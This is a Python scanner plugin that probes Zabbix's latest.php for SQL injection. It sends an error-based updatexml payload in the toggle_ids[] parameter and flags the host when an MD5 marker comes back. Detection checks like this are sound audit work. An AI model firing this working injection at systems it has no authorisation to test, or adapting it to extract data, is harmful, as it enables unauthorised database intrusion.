#!/usr/bin/python
# -*- coding: utf-8 -*-

from engine.engine_utils.common import *
from urlparse import urlparse
from engine.engine_utils.params import query2dict
from engine.logger import scanLogger as logger


def run_url(http, ob, item):
    header = {
        "Host": ob['domain'],
        "Connection": "keep-alive",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "Referer": item['refer'],
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding": "gzip, deflate",
        # "Cookie": ob.get('cookie')
    }
    try:
        path = item['url']
        params = item['params']
        method = item['method']
        timeout = ob.get('webTimeout')
        pattern = r'latest.php?'

        result = []
        if not re.search(pattern, path, re.I):
            pass
        else:
            url_parse = urlparse(path)
            scheme = url_parse.scheme
            netloc = url_parse.netloc
            source_ip = ob.get('source_ip')
            if source_ip:
                netloc = source_ip
            params_dict = query2dict(params)
            sid = params_dict.get('sid')
            payload = "/latest.php?output=ajax&sid={sid}&favobj=toggle&toggle_open_state=1&toggle_ids[]=" \
                      "(select%20updatexml(1,concat(0x7e,(SELECT%20md5(666)),0x7e),1))".format(sid=sid)
            if sid:
                if "/zabbix/" in path:
                    new_url = "%s://%s/zabbix%s" % (scheme, netloc, payload)
                else:
                    new_url = "%s://%s%s" % (scheme, netloc, payload)

                res, content = http.request(new_url, 'GET', headers=header)
                if re.search(r'fae0b27c451c728867a567e8c1bb4e5', content, re.I):
                        detail = "存在Zabbix latest SQL注入漏洞"
                        response = getResponse(res, content, keywords='fae0b27c451c728867a567e8c1bb4e5')
                        request = getRequest(new_url, 'GET', headers=header, domain=ob['domain'])
                        result.append(getRecord(ob, new_url, ob['level'], detail, request, response))
        return result

    except Exception, e:
        logger.error("File:zabbix_latest_sqlinj_url.py, run_url function :%s" % (str(e)))
        return result

